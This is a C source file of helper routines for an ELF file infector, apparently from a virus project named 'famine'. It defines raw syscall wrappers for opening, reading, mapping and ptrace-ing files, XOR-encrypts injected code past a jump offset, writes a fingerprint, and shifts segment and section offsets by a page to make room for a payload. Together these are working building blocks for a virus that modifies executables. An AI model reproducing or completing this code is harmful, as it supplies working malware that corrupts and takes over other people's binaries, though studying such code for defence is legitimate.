#include "famine.h"

inline	Elf64_Shdr *elf_sheader(Elf64_Ehdr *header) {
	return (Elf64_Shdr *)((void*)header + header->e_shoff);
}

inline	Elf64_Phdr *elf_pheader(Elf64_Ehdr *header) {
	return (Elf64_Phdr *)((void*)header + header->e_phoff);
}

inline	Elf64_Shdr *elf_section(Elf64_Ehdr *header, int i) {
	return &elf_sheader(header)[i];
}

inline	Elf64_Phdr *elf_program(Elf64_Ehdr *header, int i) {
	return &elf_pheader(header)[i];
}

char			*elf_str_table(Elf64_Ehdr *header) {
	if (header->e_shstrndx == SHN_UNDEF)
		return NULL;
	return (char *)header + elf_section(header, header->e_shstrndx)->sh_offset;
}

char			*elf_lookup_string(Elf64_Ehdr *header, int offset) {
	char *strtab = elf_str_table(header);
	if (strtab == NULL)
		return NULL;
	return strtab + offset;
}

int				ft_sysopen(int fd, char *binary, int flags)
{
	asm("syscall" : "=r" (fd) : "a" (SYS_open), "D" (binary), "S" (flags));
	return (fd);
}

off_t			ft_syslseek(int fd, int offset, int whence)
{
	off_t	size;
	
	asm("syscall" :  "=r" (size) : "a" (SYS_lseek), "D" (fd), "S" (offset), "d" (whence));
	return (size);
}

int				ft_sysclose(int fd)
{
	asm("syscall" :  "=r" (fd) : "a" (SYS_close), "D" (fd));
	return (fd);
}

void			ft_syswrite(int fd, void *ptr, int size_file)
{
	asm("syscall" :: "a" (SYS_write), "D" (fd), "S" (ptr), "d" (size_file));
}

void			ft_sysread(int fd, char *buf, size_t count)
{
	asm("syscall" :: "a" (SYS_read), "D" (fd), "S" (buf), "d" (count));
}

int				ft_sysgetdents(int fd, struct dirent *dirp, int count)
{
	int		ret;
	
	asm("syscall" : "=r" (ret) : "a" (SYS_getdents), "D" (fd), "S" (dirp), "d"(count));
	return (ret);
}

void			*ft_sysmmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset)
{
	void	*ptr;
	
	asm("mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov %3, %%r10\n"
		"mov %4, %%r8\n"
		"mov %5, %%r9\n"
		"mov %6, %%rax\n"
		"syscall\n" :: "g"(addr), "g"(length), "g"(prot), "g"(flags), "g"(fd), "g"(offset), "g"(SYS_mmap));
	asm("mov %%rax, %0" : "=r"(ptr));
	return (ptr);
}

int				ft_sysmunmap(void *addr, size_t length)
{
	int		ret;
	
	asm("syscall" :  "=r" (ret) : "a" (SYS_munmap), "D" (addr), "S" (length));
	return (ret);
}

struct stat 	*ft_sysfstat(unsigned int fd, struct stat *buf)
{
	asm("syscall" :: "a" (SYS_fstat), "D" (fd), "S" (buf));
}

long			ft_sysptrace(long request, long pid, unsigned long addr, void *data)
{
	long	ret;
	
	asm("mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov %3, %%r10\n"
		"mov %4, %%rax\n"
		"syscall\n" :: "g"(request), "g"(pid), "g"(addr), "g"(data), "g"(SYS_ptrace));
	asm("mov %%rax, %0" : "=r"(ret));
	return (ret);
}

char			*encrypt(char *code, size_t size, int key)
{
	int		i;
	int		j;
	int		m;

	i = 0;
	j = JMP_ADDR + JMP_SIZE;
	while (i < CODE_SIZE && i + j < size)
	{
		*(int*)(code + i + j) ^= key;
		i++;
	}
	return (code);
}

static int	ft_len(int n)
{
	int		i;

	i = 0;
	if (n == 0)
		return (1);
	if (n < 0)
		i++;
	while (n != 0)
	{
		n /= 10;
		i++;
	}
	return (i);
}

void			ft_fingerprint(int n, char *str)
{
	int		i;
	int		len;
	int		signe;
	
	signe = 1;
	len = ft_len(n);
	if (!str)
		return ;
	if (n == 0)
		str[0] = '0';
	if (n < 0)
	{
		str[0] = '-';
		signe = -1;
	}
	i = len - 1;
	while (n != 0)
	{
		str[i--] = (n % 10) * signe + '0';
		n = n / 10;
	}
	str[len] = '\0';
}

char			*ft_memstr(const void *ptr, char *s, size_t n)
{
	char	*s2;
	int		i;
	int		j;

	i = 0;
	j = 0;
	s2 = (char*)ptr;
	if (s[i] == '\0')
		return ((char*)s2);
	while (i < n)
	{
		if (s[j] == '\0')
			return ((char*)&s2[i]);
		if (s2[i + j] == s[j] && i + j < n)
			j++;
		else
		{
			j = 0;
			i++;
		}
	}
	return (0);
}

void			update_segment_64(Elf64_Ehdr *header, Elf64_Off offset)
{
	Elf64_Phdr	*program;
	int			i;

	i = 0;
	while (i < header->e_phnum)
	{
		program = elf_program(header, i++);
		if (program->p_offset >= offset)
		{
			program->p_offset += PAGE_SIZE;
		}
	}
}

void			update_section_64(Elf64_Ehdr *header, Elf64_Off offset)
{
	Elf64_Shdr	*section;
	int			i;

	i = 0;
	while (i < header->e_shnum)
	{
		section = elf_section(header, i++);
		if (section->sh_offset > offset)
		{
			section->sh_offset += PAGE_SIZE;
		}
	}
}